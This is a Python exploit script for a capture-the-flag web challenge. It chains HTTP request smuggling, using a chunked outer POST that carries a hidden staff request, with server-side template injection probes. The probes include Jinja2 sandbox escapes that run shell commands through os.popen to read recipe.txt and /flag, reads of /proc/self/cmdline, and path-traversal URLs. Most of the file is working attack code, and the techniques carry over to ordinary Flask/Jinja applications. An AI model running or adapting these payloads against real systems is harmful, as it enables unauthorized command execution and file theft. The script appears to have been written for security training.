#!/usr/bin/env python3
"""FortID Sticky Headers: reproduce a known v1 smuggled staff request and
probe template-engine semantics and narrow file-access routes.

No dependencies beyond Python 3 stdlib. Designed for a challenge instance.
Every probe is saved verbatim (request, response, analysis); no guesses presented
as confirmed file access. Use --limit and --mode to select a short experiment.
"""
import argparse
import concurrent.futures
import html
import json
import re
import socket
import ssl
import time
from collections import Counter
from pathlib import Path
from urllib.parse import urlencode

DEFAULT_HOST = '<host>'
FLAG_RE = re.compile(rb'FortID\{[^\r\n}]{1,200}\}')
PREVIEW_RE = re.compile(rb'<div\s+class=["\']preview["\']\s*>(.*?)</div>', re.I | re.S)


def http_req(method, path, host, data=b'', headers=()):
    hh = [("Host", host), ("Connection", "keep-alive")]
    hh.extend(headers)
    if data and not any(k.lower() in ('content-length', 'transfer-encoding') for k, _ in hh):
        hh.append(('Content-Length', str(len(data))))
    if data and not any(k.lower() == 'content-type' for k, _ in hh):
        hh.append(('Content-Type', 'application/x-www-form-urlencoded'))
    return (f'{method} {path} HTTP/1.1\r\n' +
            ''.join(f'{k}: {v}\r\n' for k, v in hh) + '\r\n').encode() + data


def wrap(host, nested, outer_te='gzip, chunked', outer_version='1'):
    # Outer request order, framing and literal data reproduce successful #070.
    return (f'POST /order HTTP/1.1\r\n'
            f'Host: {host}\r\n'
            f'X-Client-Version: {outer_version}\r\n'
            f'Content-Type: application/x-www-form-urlencoded\r\n'
            f'Connection: keep-alive\r\n'
            f'Transfer-Encoding: {outer_te}\r\n\r\n').encode() + \
           b'B\r\norder=hello\r\n0\r\n\r\n' + nested


def staff_post(host, fields, path='/staff/preview', h_extra=()):
    data = urlencode(fields).encode('ascii')
    headers = (f'POST {path} HTTP/1.1\r\n'
               f'Host: {host}\r\n'
               f'Connection: keep-alive\r\n'
               f'X-Client-Version: 1\r\n'
               f'Content-Type: application/x-www-form-urlencoded\r\n'
               f'Content-Length: {len(data)}\r\n')
    headers += ''.join(f'{k}: {v}\r\n' for k,v in h_extra)
    return (headers + '\r\n').encode() + data


def req_template(host, expression, mode='urlencode'):
    # Deliberately use urlencode: '+' becomes '%2B', not a form-space.
    if mode == 'urlencode':
        fields = {'message': expression}
        return staff_post(host, fields)
    raise ValueError(mode)


def probes(host, mode):
    data = []
    def add(kind, name, req, note=''):
        data.append((kind, name, wrap(host, req), note))

    if mode in ('all', 'engine', 'templates'):
        exprs = [
            ('control_mul', '{{7*7}}'),
            ('control_literal', '{{"recipe.txt"}}'),
            ('control_missing_name', '{{recipe}}'),
            ('arithmetic_add', '{{4+5}}'),
            ('arithmetic_minus', '{{9-5}}'),
            ('arithmetic_divide', '{{9/3}}'),
            ('arithmetic_modulo', '{{9%4}}'),
            ('arithmetic_power', '{{2**5}}'),
            ('arithmetic_floor_div', '{{9//2}}'),
            ('arithmetic_concat', '{{"A"+"B"}}'),
            ('string_multiply', '{{"AB"*3}}'),
            ('call_upper', '{{"abc".upper()}}'),
            ('call_replace', '{{"foo".replace("o","i")}}'),
            ('method_format', '{{"{}".format("HELLO")}}'),
            ('bool_true', '{{True}}'),
            ('bool_false', '{{False}}'),
            ('python_none', '{{None}}'),
            ('python_tuple', '{{(1,2)}}'),
            ('python_list', '{{[1,2]}}'),
            ('python_dict', '{{{"key":"value"}}}'),
            ('class_string', '{{"".__class__}}'),
            ('class_tuple', '{{().__class__}}'),
            ('class_int', '{{(1).__class__}}'),
            ('class_mro', '{{().__class__.__mro__}}'),
            ('class_subclasses', '{{().__class__.__base__.__subclasses__()}}'),
            ('python_getcwd', '{{__import__("os").getcwd()}}'),
            ('python_listdir', '{{__import__("os").listdir(".")}}'),
            ('python_list_root', '{{__import__("os").listdir("/")}}'),
            ('python_open_recipe', '{{open("recipe.txt").read()}}'),
            ('python_open_parent', '{{open("../recipe.txt").read()}}'),
            ('python_open_rootflag', '{{open("/flag").read()}}'),
            ('python_open_proc', '{{open("/proc/self/cmdline").read()}}'),
            ('python_builtin_open', '{{__builtins__["open"]("recipe.txt").read()}}'),
            ('python_globs', '{{globals()}}'),
            ('python_vars', '{{vars()}}'),
            ('python_eval', '{{eval("7*7")}}'),
            ('jinja_config', '{{config}}'),
            ('jinja_request', '{{request}}'),
            ('jinja_self', '{{self}}'),
            ('jinja_cycler', '{{cycler}}'),
            ('jinja_lipsum', '{{lipsum}}'),
            ('jinja_undefined', '{{not_a_known_identifier}}'),
            ('jinja_dict_attr', '{{dict.__class__}}'),
            ('jinja_cycler_global', '{{cycler.__init__.__globals__}}'),
            ('jinja_cycler_os', '{{cycler.__init__.__globals__.os.getcwd()}}'),
            ('jinja_cycler_popen', '{{cycler.__init__.__globals__.os.popen("cat recipe.txt").read()}}'),
            ('jinja_lipsum_global', '{{lipsum.__globals__.os.popen("cat recipe.txt").read()}}'),
            ('jinja_subprocess', '{{"".__class__.__mro__[1].__subclasses__()}}'),
            ('jinja_filter_upper', '{{"hello"|upper}}'),
            ('jinja_filter_attr', '{{""|attr("__class__")}}'),
            ('jinja_include', '{% include "recipe.txt" %}'),
            ('jinja_for', '{% for x in [1,2,3] %}{{x}}{% endfor %}'),
            ('python_format_read', '{{"{0.__class__}".format(5)}}'),
            ('python_format_get', '{{"{0.__class__.__mro__}".format(5)}}'),
            ('python_index_list', '{{["a","b"][1]}}'),
            ('jinja_index_expr', '{{()[0]}}'),
            ('unicode_test', '{{"test\\u002fpath"}}'),
            ('format_shell', '{{__import__("os").popen("cat /flag").read()}}'),
        ]
        for label, expr in exprs:
            add('engine', label, req_template(host, expr), expr)

    if mode in ('all', 'paths'):
        paths = [
            '/recipe.txt', '/staff/recipe.txt', '/staff/recipe',
            '/staff/file', '/staff/files', '/staff/download', '/staff/view',
            '/staff/read', '/staff/source', '/staff/template',
            '/staff/preview', '/staff/preview?file=recipe.txt',
            '/staff/download?file=recipe.txt', '/staff/download?name=recipe.txt',
            '/staff/file?path=recipe.txt', '/staff/read?path=recipe.txt',
            '/staff/view?name=recipe.txt', '/staff/preview?template=recipe.txt',
            '/files/recipe.txt', '/static/recipe.txt', '/download/recipe.txt',
            '/flag', '/flag.txt',
            '/staff/../recipe.txt', '/staff/%2e%2e/recipe.txt',
            '/staff/%2e%2e%2frecipe.txt', '/staff/preview/../recipe.txt',
            '/staff/preview/../../recipe.txt',
            '/staff/recipe.txt?raw=1',
        ]
        for path in paths:
            add('path_get', 'GET ' + path, http_req('GET', path, host), path)
        # File names are explicit evidence; avoid broad parameter fuzzing.
        fields = [
            {'message': 'recipe.txt'},
            {'message': '{{7*7}}', 'file': 'recipe.txt'},
            {'message': '{{7*7}}', 'template': 'recipe.txt'},
            {'message': '{{7*7}}', 'filename': 'recipe.txt'},
            {'message': '{{7*7}}', 'path': 'recipe.txt'},
            {'message': '{{7*7}}', 'name': 'recipe.txt'},
            {'message': '{{7*7}}', 'include': 'recipe.txt'},
            {'message': '{{7*7}}', 'action': 'read', 'file': 'recipe.txt'},
            {'message': '{{7*7}}', 'mode': 'file', 'path': 'recipe.txt'},
        ]
        for pth in ['/staff/preview', '/staff/file', '/staff/download', '/staff/read']:
            for i, f in enumerate(fields):
                add('path_post', f'POST {pth} fields{i}', staff_post(host, f, pth), repr(f))
    return data


def send_tls(host, port, req, timeout):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    response = bytearray()
    started = time.monotonic()
    err = None
    try:
        with socket.create_connection((host, port), timeout=timeout) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as ss:
                ss.settimeout(timeout)
                ss.sendall(req)
                while len(response) < 200000:
                    try:
                        more = ss.recv(32768)
                    except socket.timeout:
                        err = 'idle_timeout'
                        break
                    if not more:
                        break
                    response.extend(more)
    except Exception as ex:
        err = f'{type(ex).__name__}: {str(ex)[:160]}'
    return bytes(response), err, round(time.monotonic() - started, 3)


def split_http(raw):
    # Do not parse HTTP responses by searching for arbitrary 'HTTP' strings in
    # HTML bodies; use Content-Length where available, including LF HTML bodies.
    out = []
    offset = 0
    while offset < len(raw):
        match = re.match(rb'HTTP/1\.[01] (\d{3}) [^\r\n]*\r\n', raw[offset:])
        if not match:
            break
        head_end = raw.find(b'\r\n\r\n', offset)
        if head_end < 0:
            break
        hdr = raw[offset:head_end].decode('latin1', 'replace')
        mcl = re.search(r'(?im)^Content-Length:\s*(\d+)\s*$', hdr)
        start = head_end + 4
        n = int(mcl.group(1)) if mcl else len(raw) - start
        body = raw[start:start+n]
        out.append((match.group(1).decode(), hdr, body))
        offset = start + n
    return out, raw[offset:]


def assess(case, host, port, timeout):
    kind, label, req, note = case
    raw, err, secs = send_tls(host, port, req, timeout)
    messages, remain = split_http(raw)
    statuses = [s for s, _, _ in messages]
    preview = None
    if len(messages) > 1:
        got = PREVIEW_RE.search(messages[1][2])
        if got:
            preview = html.unescape(got.group(1).decode('utf-8','replace'))
    flags = [f.decode('utf8','replace') for f in FLAG_RE.findall(raw)]
    nested_code = statuses[1] if len(statuses) > 1 else None
    interesting = bool(flags or nested_code not in ('200', '404', None) or
                       (kind == 'engine' and preview is not None and
                        preview not in ('', '49', 'recipe.txt')) or
                       (kind == 'path_get' and nested_code not in ('404', None)) or
                       (kind == 'path_post' and nested_code not in ('200', '404', None)))
    return {
        'kind':kind,'label':label,'note':note,'statuses':statuses,'nested_code':nested_code,
        'preview':preview,'length':len(raw),'extra_bytes':len(remain),'error':err,
        'elapsed':secs,'interesting':interesting,'flags':flags,
        'req':req,'res':raw
    }


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument('--host', default=DEFAULT_HOST)
    ap.add_argument('--port', type=int, default=1337)
    ap.add_argument('--mode', choices=['all','engine','templates','paths'], default='engine')
    ap.add_argument('--timeout', type=float, default=2.8)
    ap.add_argument('--workers', type=int, default=3)
    ap.add_argument('--limit', type=int, default=150)
    ap.add_argument('--out', default='sticky_staff_inspector_results')
    ap.add_argument('--dry-run', action='store_true')
    args=ap.parse_args()
    cases=probes(args.host,args.mode)[:args.limit]
    print(f'SCENARIO {args.mode} | {len(cases)} requests | {args.host}:{args.port}',flush=True)
    if args.dry_run:
        for name, _label, req, note in cases[:12]:
            print(name, note, 'HTTP size', len(req))
        return
    folder=Path(args.out); folder.mkdir(exist_ok=True,parents=True)
    results=[]
    with concurrent.futures.ThreadPoolExecutor(max_workers=max(1,min(args.workers,5))) as ex:
        future_map={ex.submit(assess,case,args.host,args.port,args.timeout):i
                    for i,case in enumerate(cases)}
        for future in concurrent.futures.as_completed(future_map):
            index=future_map[future]
            record=future.result()
            req=record.pop('req'); res=record.pop('res')
            (folder/f'{index:03d}.request').write_bytes(req)
            (folder/f'{index:03d}.response').write_bytes(res)
            record['index']=index
            results.append(record)
            print(f'[{index:03}] {str(record["statuses"]):13s} {record["length"]:5d} bytes '
                  f'{record["label"]:<31.31}  preview={str(record["preview"])[:110]!r}',flush=True)
            if record['flags']:
                print('FLAG FOUND:',record['flags'],flush=True)
    results.sort(key=lambda x:x['index'])
    (folder/'summary.json').write_text(json.dumps(results,indent=2,ensure_ascii=False))
    print('\nRESPONSE GROUPS:',dict(Counter(tuple(r['statuses']) for r in results)))
    print('STAFF 200:',sum(r['nested_code']=='200' for r in results))
    print('Non-ordinary findings:')
    for r in results:
        if r['interesting']:
            print(r['index'],r['label'],r['statuses'],repr((r['preview'] or '')[:180]))
    print('Saved to:',folder.resolve())

if __name__=='__main__':
    main()
